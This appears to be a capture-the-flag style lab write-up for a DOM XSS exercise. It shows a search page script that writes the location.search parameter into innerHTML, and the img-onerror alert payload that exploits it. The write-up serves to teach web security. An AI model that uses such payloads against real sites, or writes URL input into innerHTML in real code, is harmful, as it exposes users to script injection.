### Lab: DOM XSS in innerHTML sink using source location.search
#### **Recon**
-----
**Request:**
```http
GET /?search=find_me HTTP/2
Host: 064.web-security-academy.net

...Omitted of Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3708

...Omitted of Brevety...
```
`Inspecting the web page content`
```js
...Omitted of Brevety...
<script>
	function doSearchQuery(query) {
		document.getElementById('searchMessage').innerHTML = query;
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		doSearchQuery(query);
	}
</script>
...Omitted of Brevety...
```

**Affected Locations**
```
https://064.web-security-academy.net/?search=
```

```js
document.getElementById('searchMessage').innerHTML = query;
```

### Exploitation
-----
Exploitation
----
**Payload**
```js
<image src/onerror=alert(1)>
```
**Request:**
```http
GET /?search=<image src/onerror=alert(1)> HTTP/2
Host: 0abc00250483796884b51f5300300064.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6849

...Omitted for Brevety...
```


